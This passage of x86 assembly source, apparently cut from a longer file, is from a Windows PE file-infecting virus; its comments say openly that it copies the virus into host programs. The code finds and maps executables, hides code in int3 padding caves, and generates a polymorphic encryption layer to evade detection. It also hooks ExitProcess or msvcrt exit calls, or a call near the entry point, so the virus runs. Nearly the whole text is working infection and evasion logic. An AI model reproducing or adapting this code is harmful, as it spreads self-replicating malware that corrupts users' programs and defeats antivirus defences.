   sub eax,ecx

   cmp eax,dword ptr [edx+16]      ; check if we are in ?
   ja  thenitsnotcorrect

   add ebx,eax

   mov eax,ebx
   add eax,esi             ; add handle value

   pop     ecx ebx edx
   ret

   thenitsnotcorrect:

   pop ecx ebx edx
   ret

   mapit:

       push    0
           push    dword ptr [ebp+CurrentHandle]   ; look apis reference
           call    dword ptr [ebp+GetFileSize]
           add     eax,fin-start0+500      ; allways open with size+500
           mov     edi,eax

   mapasRead:

           push     edi

       push     0
       push     edi
       push     0
           push     4
       push     0
           push     dword ptr [ebp+CurrentHandle]
       call     dword ptr [ebp+CreateFileMap]      ; mapit
           mov      dword ptr [ebp+MapHandle1],eax

   mapasRead2:

       push     0
       push     0
           push     6
           push     dword ptr [ebp+MapHandle1]
       call     dword ptr [ebp+ViewMap]        ; load mapit
           mov      dword ptr [ebp+MapHandle2],eax
           ret

   unmapit:

       push    dword ptr [ebp+MapHandle2]
       call    dword ptr [ebp+UnMap]           ; close maps

       push    dword ptr [ebp+MapHandle1]
       call    dword ptr [ebp+Close]           ; close maps

       ret

   Alloc:

   push    040h
   push    00100000h or 1000h or 2000h
   add eax,111b
   and eax,-4
   push    eax
   push    0
   call    dword ptr [ebp+LocalAlloc]          ; allocate memory..
   ret

   cavescanner:

   mov dword ptr [ebp+cavenumber],0

   mov     eax,handlesize1
   call    Alloc                   ; alloc memory for this routine

   cmp eax,0
   jne saveitthat

   xor eax,eax
   inc eax
   inc     eax
   add eax,-1                  ; if can't then return with
   ret                     ; carry

   saveitthat:

   mov byte ptr [ebp+memory1],1
   mov dword ptr [ebp+memhandle1],eax      ; save it for unload memory

   mov dword ptr [ebp+caveoffset],eax      ; save it for datas storing

   mov edx,dword ptr [ebp+SectionOffset]   ; look for .code or .text

   mov eax,dword ptr [edx+36]
   and eax,80000000h
   cmp eax,80000000h               ; if code writable
   je  disablecave             ; then danger! -> compressors
                           ; viruses...
   mov eax,dword ptr [edx+20]
   add eax,esi                 ;1st section is most case code
                           ;section
   mov ebx,eax
   add ebx,dword ptr [edx+16]          ; add the size

   thenscanagain:

   cmp dword ptr [eax],0CCCCCCCCh
   je  detectint3cave

   ;cmp    dword ptr [eax],090909090h      ; this one could be activated
   ;je detectnopcave               ; but for security , I didn't

   inc eax
   doomingo77:
   cmp eax,ebx
   jb  thenscanagain

   ret

   ;detectzerocave:            deactivated

   ;push   ebx
   ;mov    bl,0
   ;jmp    deteccomhere

   ;detectnopcave:
   ;
   ;push   ebx
   ;mov    bl,090h
   ;jmp    deteccomhere

   detectint3cave:         ; scan the CCh cave

   push    ebx

   mov bl,0CCh

   deteccomhere:

   push    ecx
   push    edx
   push    eax

   thendoit:

   xor ecx,ecx

   looping0:
   cmp byte ptr [eax],bl           ; count number of CCh
   jne unplusun                ; there's (minimum 4)
   inc eax
   inc ecx
   jmp     looping0

   unplusun:

   mov edx,eax
   pop eax

   push    edx
   cmp byte ptr [eax-1],0C3h           ; look if there's ret
   je  thendoit00

   cmp byte ptr [eax-3],0C2h           ; or retf2 before
   jne nocave

   thendoit00:

   pop edx
   push    edx
   sub edx,eax

   cmp byte ptr [ebp+cavenumber],0FFh      ; check if we found max
   je  overfound               ; imagine on 4 megs programs...

   inc byte ptr [ebp+cavenumber]       ; increment it

   mov ecx,dword ptr [ebp+caveoffset]      ;

   mov dword ptr [ecx],edx
   mov dword ptr [ecx+4],eax
   call    Offset2Address
   mov dword ptr [ecx+4+4],eax

   add ecx,12
   mov dword ptr [ebp+caveoffset],ecx      ; save offset

   mov     eax,edx

   overfound:

   nocave:

   pop eax                 ; restore it
   pop edx
   pop ecx
   pop ebx
   jmp doomingo77

   disablecave:

   mov byte ptr [ebp+cavedanger],1     ;
   ret

   ; variables

   cavenumber: db  0
   cavedanger: db  0
   caveoffset: dd  0

   CreateProPoly:

   mov word ptr [ebp+Registers],-1

   mov eax,handlesize2
   call    Alloc                   ; alloc memory
   cmp eax,0

   jne thenthatat

   inc eax
   inc eax
   add eax,-1
   ret

   thenthatat:

   mov byte ptr [ebp+memory2],1
   mov dword ptr [ebp+memhandle2],eax      ; save it

   mov dword ptr [ebp+PolyTable],eax
   add eax,40
   mov dword ptr [ebp+PolyTablePoint],eax  ; set everything

   lea ebx,[eax+256]
   mov dword ptr [ebp+PolyOffset],ebx

   push    esi
   push    edi
   mov edi,ebx

   lea esi,[ebp+start]
   mov ecx,((((fin-start)/4)+1)*4)

   repz    movsb                   ; copy virus to memory

   pop edi
   pop esi

   lea ebx,[eax+256+((((Fin-Start)/4)+1)*4)]
   mov dword ptr [ebp+PolyPointer],ebx

   mov edx,dword ptr [ebp+PEBase]
   mov ecx,dword ptr [edx+8]           ; get time/date stamp
   push    ecx

   and ecx,01111b              ; as variable value
   add ecx,5
   pop eax
   push    ecx

   ror     eax,8
   push    eax
   and eax,111b
   call    getvalidregister            ; get register
   mov byte ptr [ebp+ActionRegister],al

   pop eax
   ror eax,4
   and eax,111b
   call    getvalidregister            ; get second register
   mov byte ptr [ebp+LoopValue],al

   pop ecx

   latinlingo:

   call    AddInstruction0             ; make crypt instructions

   loop    latinlingo

   push    esi
   push    edi

   mov edi,dword ptr [ebp+PolyTablePoint]
   mov     esi,dword ptr [ebp+PolyTable]
   add esi,40

   sub edi,8

   thendontfool:                   ; reversive functions

   mov eax,dword ptr [esi]
   mov ebx,dword ptr [esi+4]

   mov ecx,dword ptr [edi]         ; equal size/offset
   mov edx,dword ptr [edi+4]

   mov dword ptr [esi],ecx
   mov dword ptr [esi+4],edx

   mov dword ptr [edi],eax
   mov dword ptr [edi+4],ebx

   sub edi,8
   add esi,8

   cmp esi,edi
   jb  thendontfool                    ; invert the decryptor

   pop edi
   pop esi

   mov edx,dword ptr [ebp+PolyTable]
   mov ecx,dword ptr [ebp+PolyPointer]
   mov ebx,ecx

   mov dword ptr [ecx],60h             ; add pushad to decryp
   inc ecx
   call    ActualisePointer

   mov byte ptr [ecx],0B8h             ; add mov ...,polyoff
   mov al,byte ptr [ebp+LoopValue]         ; to decrypt
   add byte ptr [ecx],al

   mov eax,dword ptr [ebp+DropAddress]
   add eax,dword ptr [ebp+ImageBase]

   mov dword ptr [ecx+1],eax
   add ecx,5

   call    ActualisePointer

   mov ax,008Bh                    ; add mov ..,[...]
   mov ah,byte ptr [ebp+ActionRegister]        ; to decrypt
   shl ah,3
   add ah,byte ptr [ebp+LoopValue]
   mov     word ptr [ecx],ax
   add ecx,2

   call    ActualisePointer

   push    ecx

   mov ecx,dword ptr [ebp+PolyTable]           ; drop
   add ecx,40                      ; decrypt math
                               ; functions
   ambiancee:
   mov eax,dword ptr [ecx]
   mov ebx,dword ptr [ecx+4]

   cmp eax,0
   je  thenfinish88

   mov dword ptr [edx],eax             ; now do the loop
   mov dword ptr [edx+4],ebx

   add ecx,8
   add edx,8
   jmp ambiancee                   ; ambiancee...

   thenfinish88:

   pop ecx

   ; - - - - -

   mov ax,0089h                    ; mov [...],...
   mov ah,byte ptr [ebp+ActionRegister]
   shl ah,3
   add ah,byte ptr [ebp+LoopValue]         ; are you really
   mov     word ptr [ecx],ax               ; reading that ?
   add ecx,2

   call    ActualisePointer

   mov ax,0C083h                   ; add ...,...
   add ah,byte ptr [ebp+LoopValue]
   mov     word ptr [ecx],ax
   add ecx,2
   mov     byte ptr [ecx],04
   inc     ecx

   call    ActualisePointer                ; add cmp,...
                               ;
   mov ax,0f881h                   ;
   add ah,byte ptr [ebp+LoopValue]
   mov     word ptr [ecx],ax

   mov eax,dword ptr [ebp+DropAddress]
   add eax,dword ptr [ebp+ImageBase]
   add eax,((((fin-start)/4)+1)*4)
   mov dword ptr [ecx+2],eax
   add ecx,6

   call    ActualisePointer

   mov word ptr [ecx],0850Fh               ; add jnz ...
   add ecx,6                       ; with relocs

   call    ActualisePointer

   mov byte ptr [ecx],61h

   mov byte ptr [ecx+1],068h
   mov eax,dword ptr [ebp+DropAddress]         ; now drop
   add eax,dword ptr [ebp+ImageBase]           ; return to virus
   mov dword ptr [ecx+2],eax

   mov byte ptr [ecx+6],0C3h
   add ecx,7

   call    ActualisePointer

   push    esi
   push    edi

   xor ebx,ebx

   mov     edx,dword ptr [ebp+PolyTable]           ; now drop the
   mov     edi,dword ptr [ebp+DropOffset]          ; virus into host body
   add edi,esi

   mov esi,dword ptr [ebp+PolyOffset]
   mov ecx,((((fin-start)/4)+1)*4)
   repz    movsb

   push    esi
   mov esi,dword ptr [ebp+MapHandle2]
   mov eax,edi
   call    Offset2Address
   mov dword ptr [ebp+NEWEntryPoint],eax
   mov dword ptr [ebp+FirstEntryPoint],eax
   pop esi                     ; set poly entrypoint

   mov dword ptr [ebp+lastreloc],0
   call    droptocaves                 ; 1st drop to cave

   thegothere:

   cmp bl,byte ptr [ebp+WantedReloc]           ; now we can drop
   jne thennoreloc
   mov dword ptr [ebp+Reloc1],edi

   thennoreloc:

   mov     esi,dword ptr [edx]             ; the poly after
   cmp esi,0
   je  thenitsfinish

   cmp word ptr [esi],850Fh                ; look for jnz
   je  ApplyReloc                  ; if so reloc it

   relocdoitnow:

   mov ecx,dword ptr [edx+04]
   repz    movsb
   add edx,8                       ; drop it after virus
   inc ebx
   jmp thegothere

   thenitsfinish:

   pop edi
   pop esi

   ret

   droptocaves:

   cmp byte ptr [ebp+cavedanger],1         ; look if .code
   je  thennocave                  ; writable

   cmp byte ptr [ebp+cavenumber],0         ; look if there no cave
   je  thennocave                  ; if ONE then
                               ; it's okay, coz we
   mov dword ptr [ebp+originalreloc],edi       ; can hide our
   push    edi                     ; poly entrypoint
   xor ebx,ebx

   detectcave0:

   mov esi,dword ptr [edx]
   cmp esi,0
   je  thenfinish

   mov ecx,dword ptr [edx+4]               ; get cave and check

   call    detectcave                  ; size
   jc  thenfinish

   mov eax,dword ptr [ebp+FirstEntryPoint]
   cmp dword ptr [ebp+NEWEntryPoint],eax       ; if 1st cave then set
   jne thendontchangeentrypoint            ; entrypoint

   push    esi

   mov eax,edi
   mov esi,dword ptr [ebp+MapHandle2]          ; get cave and fix
   call    Offset2Address                  ; to memory offset
   mov dword ptr [ebp+NEWEntryPoint],eax

   pop esi

   thendontchangeentrypoint:

   cmp bl,byte ptr [ebp+WantedReloc]
   jne thennorelocbis
   mov dword ptr [ebp+Reloc1],edi

   thennorelocbis:

   cmp word ptr [esi],850Fh                ; check for jnz
   je  ApplyRelocBis                   ; then apply large
                               ; relocs over caves
   relocdoitnowbis:

   repz movsb

   mov byte ptr [edi],0E9h             ; apply calls...

   add edx,8
   inc ebx
   jmp detectcave0

   thenfinish:

   pop edi

   thennocave:

   ret

   detectcave:

   push    edx ecx ebx

   mov ebx,dword ptr [ebp+caveoffset]          ; get caves
   xor eax,eax
   mov al,byte ptr [ebp+cavenumber]

   push    edx
   push    ecx
   push    eax
   mov ecx,12
   mul ecx
   pop ecx
   sub ebx,eax                     ; calculations

   sub ebx,12
   pop edx
   add edx,5

   thengetnextcave:

   add ebx,12
   mov     eax,dword ptr [ebx]

   cmp eax,edx
   jae thenwefoundone

   loop    thengetnextcave             ;

   pop edx
   cmp dword ptr [ebp+lastreloc],0
   je  thenitsfinishfordebon           ; if reloc off then finish

   push    ebx

   mov eax,dword ptr [ebp+DropAddress]
   add eax,((((fin-start)/4)+1)*4)
   sub eax,dword ptr [ebp+lastreloc]       ; set last reloc for further
   sub eax,4                   ; jnz

   mov ebx,dword ptr [ebp+lastrelocOffset]
   mov dword ptr [ebx],eax

   pop ebx

   thenitsfinishfordebon:

   inc     eax
   inc eax

   sub     eax,-1

   pop ebx ecx edx

   ret             ; return to carry to main drop cave functions
                   ; then finish cave droping
   originalreloc:  dd  0

   thenwefoundone:

   pop edx

   mov dword ptr [ebx],0               ; if found one

   cmp dword ptr [ebp+lastreloc],0         ; if 1st instruction?
   je  thendontneedfixup

   mov eax,dword ptr [ebx+4+4]
   sub eax,dword ptr [ebp+lastreloc]           ; set jump to here
   sub eax,4                       ; from last instruction

   push    ebx

   mov ebx,dword ptr [ebp+lastrelocOffset]
   mov dword ptr [ebx],eax

   pop ebx

   thendontneedfixup:                  ; no fixup need

   mov     ecx,dword ptr [edx+4]
   add ecx,dword ptr [ebx+4]
   inc     ecx
   mov     dword ptr [ebp+lastrelocOffset],ecx     ; save this offset
   sub ecx,dword ptr [ebx+4]
   add ecx,dword ptr [ebx+8]               ; for next fixup
   mov     dword ptr [ebp+lastreloc],ecx

   mov     edi,dword ptr [ebx+4]
   xor ebx,ebx
   pop ebx ecx edx

   ret

   lastreloc:      dd  0
   lastrelocOffset:    dd  0

   NEWEntryPoint:  dd  0

   Reloc1: dd  0
   WantedReloc:    db  2

   ApplyReloc:
   call    ApplyReloc0             ; this for jnz
   jmp relocdoitnow

   ApplyRelocBis:
   call    ApplyReloc0             ; this for jnz in cave
   jmp relocdoitnowbis

   ApplyReloc0:

   push    eax edi
   push    esi
   mov esi,dword ptr [ebp+MapHandle2]      ; recalculate offsets
                           ;
   mov eax,dword ptr [ebp+Reloc1]
   call    Offset2Address
   push    eax             ; eax is save

   mov eax,edi
   call    Offset2Address
   mov edi,eax

   pop eax
   sub eax,edi
   sub eax,6                   ; build delta for jumps
   pop esi
   mov dword ptr [esi+2],eax           ; set it where we need it

   pop edi eax
   ret

   ActualisePointer:

   push    ebx
   push    ecx

   mov ebx,dword ptr [ebp+PolyPointer]         ;set pointer of
   mov dword ptr [edx],ebx             ;of current instruction
   sub ecx,ebx
   add dword ptr [ebp+PolyPointer],ecx         ; that can be different

   mov dword ptr [edx+4],ecx               ; of instruction order
   add edx,8

   pop ecx
   pop ebx

   ret

   AddInstruction0:

   push    edx
   push    ecx

   mov edx,dword ptr [ebp+PEBase]
   mov edx,dword ptr [edx+8]

   mov ebx,-1
   firstloop:

   mov bl,dh                       ; get randoms value
   rol ebx,4

   xor edx,'RATS'
   sub edx,'OREZ'                  ; using pseudo table
   cmp edx,00FFFFFFh                   ; ;] vecna
   ja  thendontnoise
   ror edx,16
   add edx,24051981
   thendontnoise:
   dec edx
   xor ebx,edx
   loop    firstloop

   mov edx,ebx                     ; edx = random value
   not edx                     ; for sub xor ror add
   mov dword ptr [ebp+UnknownVal],edx

   and edx,111b                    ; seting random from
   mov eax,edx                     ; 1/8
   mov ecx,4
   mul ecx
   add eax,dword ptr [ebp+TableOffset]
   add eax,ebp

   push    esi
   push    edi

   mov eax,dword ptr [eax]
   add eax,ebp

   mov ebx,dword ptr [ebp+PolyTablePoint]      ; get what instruction
   mov esi,dword ptr [ebp+PolyPointer]

   mov dword ptr [ebx],esi             ; to do
   push    esi
   push    ebx

   call    eax                     ; call it from the
                               ; tale
   pop ebx
   mov eax,esi
   pop ecx
   sub     eax,ecx

   mov dword ptr [ebx+4],eax
   add ebx,8
   mov dword ptr [ebp+PolyTablePoint],ebx      ; psuedo actualisation
   mov dword ptr [ebp+PolyPointer],esi         ; of pointers

   pop edi
   pop esi

   pop ecx
   pop edx

   ret

   getvalidregister:

   cmp     al,111b
   jna thentestnext                ; test if > edi
   mov al,0

   thentestnext:
   cmp al,100b
   jne thentestnext2               ; test if esp
   inc al
   jmp getvalidregister

   thentestnext2:
   cmp     al,byte ptr [ebp+ActionRegister]
   jne thentestnext3
   inc al
   jmp getvalidregister            ; test if action register

   thentestnext3:
   cmp     al,byte ptr [ebp+LoopValue]     ; test if loop register
   jne thentestnext4
   inc al
   jmp getvalidregister

   thentestnext4:
   cmp byte ptr [ebp+ActionRegister],-1
   je  thenfinishtest

   cmp al,101b                 ; cmp if loop register = ebp
   jne     thenfinishtest              ; don't do so coz crashing

   inc al
   jmp getvalidregister

   thenfinishtest:
   ret

   TableOffset:

   dd  Offset Table0

   Table0: dd  Offset AddInstruction
       dd  Offset SubInstruction
       dd  Offset XorInstruction
       dd  Offset INCInstruction
       dd  Offset DECInstruction
       dd  Offset NEGInstruction
       dd  Offset NOTInstruction
       dd  Offset ROLInstruction

   ROLInstruction:

   mov ax,0C1C8h
   add     al,byte ptr [ebp+ActionRegister]
   mov edx,dword ptr [ebp+UnknownVal]
   xor edx,'FLOR'              ; make ROL
   xchg    al,ah
   mov word ptr [esi],ax
   and dh,00111111b
   inc dh
   mov byte ptr [esi+2],dh
   add esi,3

   lea eax,[ebp+Roritloop]
   call    applycript

   ret

   Roritloop:  push    ecx
           mov cl,dh
           rol     dword ptr [edi],cl
           pop ecx
           ret

   NOTInstruction:

   mov     ax,0F7D0h
   call    dothat79
   lea eax,[ebp+NOTitloop]         ; make not instruction
   call    applycript
   ret

   NOTitloop:  not dword ptr [edi]
           ret

   NEGInstruction:

   mov     ax,0F7D8h
   call    dothat79
   lea eax,[ebp+NEGitloop]     ; add negs
   call    applycript
   ret

   dothat79:
   add     al,byte ptr [ebp+ActionRegister]
   xchg    al,ah
   mov     word ptr [esi],ax
   inc     esi                 ;add not/neg
   inc     esi

   ret

   NEGitloop:  neg dword ptr [edi]
           ret

   DECInstruction:             ; apply dec/inc

   lea ebx,dword ptr [ebp+Decitloop]
   mov     al,48h
   call    dothat78

   ret

   Decitloop:  inc     dword ptr [edi]
           ret

   INCInstruction:

   mov     al,40h
   lea ebx,[ebp+Incitloop]

   dothat78:                   ; common for dec/inc
   add     al,byte ptr [ebp+ActionRegister]
   mov     byte ptr [esi],al
   inc     esi

   mov eax,ebx
   call    applycript

   ret

   Incitloop:  dec     dword ptr [edi]
           ret

   XorInstruction:                 ; common for xor/add/sub

   mov ax,081F0h
   lea ebx,[ebp+Xoritloop]
   jmp dothat77

   Xoritloop:  xor dword ptr [edi],edx ; reverse of xor
           ret

   SubInstruction:

   mov ax,081E8h
   lea ebx,[ebp+Subitloop]
   jmp dothat77

   Subitloop:  add dword ptr [edi],edx     ; reverse of sub
           ret

   AddInstruction:

   mov ax,081C0h
   lea ebx,[ebp+Additloop]

   dothat77:
   add al,byte ptr [ebp+ActionRegister]

   mov edx,dword ptr [ebp+UnknownVal]
   xor edx,'AXLB'              ; a kiss to Axelle Bailey
   xchg    al,ah
   mov word ptr [esi],ax
   mov dword ptr [esi+2],edx

   add esi,6

   mov eax,ebx
   call    applycript              ; rverse of add
   ret

   Additloop:

   sub dword ptr [edi],edx

   ret

   applycript:

   push    ecx             ; apply eax to all the virus
   push    edi
   push    esi

   mov edi,dword ptr [ebp+PolyOffset]
   mov ecx,((((fin-start)/4)+1)*4)

   thentooti:


   call    eax
   sub ecx,4
   add edi,4

   cmp ecx,0
   jne thentooti

   pop esi
   pop edi
   pop ecx

   ret

   ; variables

   FirstEntryPoint:    dd  0

   Registers:

   ActionRegister: db  0
   LoopValue:  db  0

   UnknownVal: dd  0

   PolyOffset: dd  0
   PolyPointer:    dd  0

   PolyTable:  dd  0
   PolyTablePoint: dd  0

   ; 1st look for ExitProcess -> The classic way to quit a program
   ; 2 look for MSCVRT -> The win98 way to quit a program
   ; 3 look for obscure entrypoint

   thahook:

   mov dword ptr [ebp+comethatname],'NREK'
   mov dword ptr [ebp+comeApi1],'tixE'
   mov dword ptr [ebp+comeApi2],'corP'
   mov dword ptr [ebp+comeReturnWay],offset ExitProcRet
   mov     dword ptr [ebp+comeReturnAPI],offset ExitProcRetData

   call    hookapis                ; Hook apis
   jnc thenwehadit

   mov dword ptr [ebp+comethatname],'CVSM'
   mov dword ptr [ebp+comeApi1],'tixe'
   mov dword ptr [ebp+comeApi2],0
   mov dword ptr [ebp+comeReturnWay],offset ExitProcRet
   mov     dword ptr [ebp+comeReturnAPI],offset ExitProcRetData

   call    hookapis                ; Hook apis
   jnc thenwehadit

   obscureentry:               ; if no api hooked then:

   mov     edx,dword ptr [ebp+PEBase]
   mov     eax,dword ptr [edx+40]
   call    Address2Offset
   mov edx,eax

   mov ecx,500             ; hook call near entrypoint

   findthoseit:
   cmp byte ptr [edx],0E8h     ; call opcode
   je  hookentry

   cmp byte ptr [edx],0E9h     ; jump opcade
   je  hookentry

   looknext:
   inc edx
   loop    findthoseit         ; look for it

   jmp thenofound

   thenwehadit:
   xor eax,eax
   ret

   hookentry:

   cmp byte ptr [edx+4],0
   jne looknext

   mov al,byte ptr [edx-1]     ;check for have sub functions , appears
   and al,11000000b            ;sometime (ie:tasm\bin\jitime.exe)
   cmp     al,10000000b
   je  looknext

   mov eax,edx
   call    Offset2Address          ; convert where we found it

   add eax,dword ptr [edx+01]
   add eax,5

   add eax,dword ptr [ebp+ImageBase]   ; then save it over there
   mov dword ptr [ebp+ReturnData],eax
   mov dword ptr [ebp+ReturnWay],offset retione

   inc edx
   mov dword ptr [ebp+Fixupentry],edx      ; set where the entrypoint
                           ; will have to get fixed up
   xor eax,eax
   ret

   ExitProcRet:                    ; return procedure

   mov eax,dword ptr [ebp+ReturnData]
   mov eax,dword ptr [eax]
   mov dword ptr [ebp+ReturnData],eax      ; refix all

   retione:

   popad                       ; refix regs

   db  68h

   ExitProcRetData:

   ReturnData:
   dd  Offset payload0
   ret                     ; fake jump...

   hookapis:

   mov     edx,dword ptr [ebp+PEBase]
   mov     eax,dword ptr [edx+128]         ; look for import address
   call    Address2Offset              ; get offset

   mov     ecx,eax
   sub     ecx,20

   thenaddnext:

   add     ecx,20
   cmp     dword ptr [ecx],0
   je      thenfinishscan              ; look for the correct name

   mov     eax,dword ptr [ecx+12]
   call    Address2Offset
   push    ebx
   mov ebx,dword ptr [ebp+comethatname]
   cmp     dword ptr [eax],ebx         ; does we have it ?
   pop ebx
   jne     thenaddnext

   mov     eax,dword ptr [ecx]         ;then get the rva of the import
   call    Address2Offset              ; name lookup
   mov     ebx,eax
   sub     ebx,4
   xor     edx,edx
   dec edx

   datact:
   inc     edx
   add     ebx,4
   mov     eax,dword ptr [ebx]         ;check if we have last one
   cmp     eax,0
   je      thenfinishscan

   call    Address2Offset              ; get it

   cmp eax,esi
   jb  thenfinishscan              ; for fixing an unknown bug...

   push    ebx
   mov ebx,dword ptr [ebp+comeApi1]        ; look if name is correct
   cmp ebx,0
   je  passbythat
   cmp     dword ptr [eax+2],ebx
   pop ebx
   jne     datact

   push    ebx
   mov ebx,dword ptr [ebp+comeApi2]        ; look if name after is correct
   cmp ebx,0
   jne passbythat
   cmp byte ptr [eax+6],0          ; if the name = 0 then
   jmp passbythat0             ; don't scan ofcourse
   passbythat:
   cmp     dword ptr [eax+6],ebx
   passbythat0:
   pop ebx
   jne     datact

   thatoskay:

   mov     eax,edx
   mov     edx,04
   mul     edx

   add     eax,dword ptr [ecx+16]          ; now we get the api loc

   detectandhookexitpoint:

   mov     byte ptr [ebp+numberoffound],0      ; just for internal purpose
                           ; but not used anyway
   mov edx,dword ptr [ebp+PEBase]
   add eax,dword ptr [edx+52]

   mov     edx,dword ptr [ebp+SectionOffset]   ; get the 1st section
   mov ecx,dword ptr [edx+16]
   mov     edx,dword ptr [edx+20]
   add edx,esi

   findthem:
   cmp     word ptr [edx],015FFh           ; look for call dword [x]
   je  testcalltoit
   cmp word ptr [edx],025ffh           ; look for jump dword [x]
   je  testfindjmptoit

   findthemreturn:

   inc     edx
   loop    findthem                ; if nothing

   cmp     byte ptr [ebp+numberoffound],0      ; if zero found then don't
   je  thenofound              ; return with carry
   findthemfinish:
   xor eax,eax
   ret

   thenfinishscan:
   thenofound:
   inc eax
   inc eax
   add eax,-1
   ret

   numberoffound:  db  0

   testcalltoit:                   ;

   cmp     dword ptr [edx+2],eax           ; save where it call
   jne     findthemreturn

   push    edx
   mov edx,dword ptr [ebp+comeReturnAPI]   ; save API location
   add edx,ebp                 ; for return to host
   mov dword ptr [edx],eax
   pop edx

   mov eax,dword ptr [ebp+comeReturnWay]   ; save [x] location to return
   mov dword ptr [ebp+ReturnWay],eax       ; over there

   thendontsaveAPIOffset:

   push    edi
   push    edx
   inc edx
   mov     edi,edx
   mov dword ptr [ebp+Fixupentry],edi      ; fixing virus entrypoint
   mov     byte ptr [edi-1],0E9h
   pop edx
   pop edi

   inc     byte ptr [ebp+numberoffound]

   jmp     findthemfinish              ; we finished okay carry...

   testfindjmptoit:

   cmp     dword ptr [edx+2],eax
   jne     findthemreturn

   push    edx
   mov edx,dword ptr [ebp+comeReturnAPI]   ; we will look for call
   add edx,ebp
   mov dword ptr [edx],eax         ; to that jump
   mov eax,dword ptr [ebp+comeReturnWay]
   mov dword ptr [ebp+ReturnWay],eax
   pop edx

   mov eax,edx
   call    Offset2Address
   mov dword ptr [ebp+APItarget],eax

   mov     edx,dword ptr [ebp+SectionOffset]
   mov ecx,dword ptr [edx+16]
   mov     edx,dword ptr [edx+20]          ; redo the scannning
   add edx,esi

   thenloopvone:
   cmp byte ptr [edx],0E8h
   jne thenloopskill

   mov eax,edx
   call    Offset2Address
   add eax,dword ptr [edx+1]
   add eax,5                   ;

   cmp eax,dword ptr [ebp+APItarget]       ; if APItagert = where it point
   je  patchit

   thenloopskill:                  ; then we found the good call
   inc edx
   loop    thenloopvone
   jmp thenfinishscan              ; finish scanning...

   patchit:

   push    edi
   push    edx
   inc edx
   mov     edi,edx
   mov dword ptr [ebp+Fixupentry],edi      ; fix this call as the
   mov     byte ptr [edi-1],0E9h           ; virusentrypoint
   pop edx
   pop edi

   inc byte ptr [ebp+numberoffound]

   jmp findthemfinish              ; return with carry

   APItarget:  dd  0
   Fixupentry: dd  0

   ReturnWay:  dd  Offset retione
   comethatname:   dd  0
   comeApi1:   dd  0
   comeApi2:   dd  0
   comeReturnWay:  dd  0
   comeReturnAPI:  db  0

   MapHandle1:     dd      0
   MapHandle2:     dd      0

   FindFirstFileF:                     ; prebuilded FindFirst

   lea     eax,[ebp+File_Data]
   push    eax
   push    edx

   call    dword ptr [ebp+FindFirstFile]
   mov     dword ptr [ebp+Handle],eax
   ret

   FindNextFileF:                  ; Prebuilded FindNExt

   lea     eax,[ebp+File_Data]
   push    eax
   push    dword ptr [ebp+Handle]

   Call    dword ptr [ebp+FindNextFile]

   ret

   Open_file:                  ; Prebuilded Openfile
   push    edx

   lea     eax,[ebp+(offset File_Data+02ch)]
   call    Open_File_F
   pop edx
   ret

   Open_File_F:                    ; and open file F
   push large 0
   push large 080h
   push large 3
   push large 0
   push large 1
   push 80000000h or 40000000h
   push eax

   Call dword ptr [ebp+CreateFile]

   mov dword ptr [ebp+CurrentHandle],eax
   inc eax
   ret

   Close_file:                 ; close file
   push dword ptr [ebp+CurrentHandle]
   call dword ptr [ebp+Close]
   ret

   Write_file:                 ; write file
   mov eax,offset Write
   jmp Action_file

   Read_file:

   mov eax,offset Read             ; read file

   Action_file:

   push 0
   lea ebx,[ebp+Iobytes]
   push ebx
   push ecx
   push edx
   push dword ptr [ebp+CurrentHandle]
   Call dword ptr [ebp+eax]            ; look apis references
   ret

   Seek_file:                  ; seek over it
   push large 0
   push large 0
   push edx
   push dword ptr [ebp+CurrentHandle]
   Call dword ptr [ebp+SeekFile]
   ret

   startlist:                  ; needed apis
                           ; quite a lot eh :)
   FindFirstFile:
           dd 0
   FindNextFile:
           dd 0
   CreateFile:
           dd 0
   Close:
           dd 0
   Write:
           dd 0
   Read:
           dd 0
   SeekFile:
           dd 0
   SetFileTime:
           dd 0
   GetFileSize:
           dd 0
   CreateFileMap:
           dd 0
   ViewMap:
           dd 0
   UnMap:
           dd 0
   LocalAlloc:
           dd 0
   GlobalFree:
           dd 0
   LoadLibraryA:
           dd 0
   FindClose:
           dd 0
   FreeLibrary:
           dd 0
   GetSystemTime:
           dd 0
   CreateThread:
           dd 0
   GetWindowsDirectoryA:
           dd 0
   GetCurrentDirectoryA:
           dd 0
   SetCurrentDirectoryA:
           dd 0
   GetModuleHandle:
           dd 0
   ExitProc:
           dd 0
   advapilist:
   RegOpenKeyA:
           dd 0
   RegQueryValueExA:
           dd 0
   RegCloseKey:
           dd 0
   userapilist:
   MessageBoxA:    dd 0

   pseudofin:

   Handle:     dd  0
   CurrentHandle:  dd  0
   Iobytes:    dd  0

   File_Data:  db  2ch+13+5 dup (?)    ; just for prebuilded

   ;ReadyForHost:  db  0F8h dup (?)
   ;TableHost: db  4096/2 dup (?)

   Fin:
   fin:
   ends
   end HOST



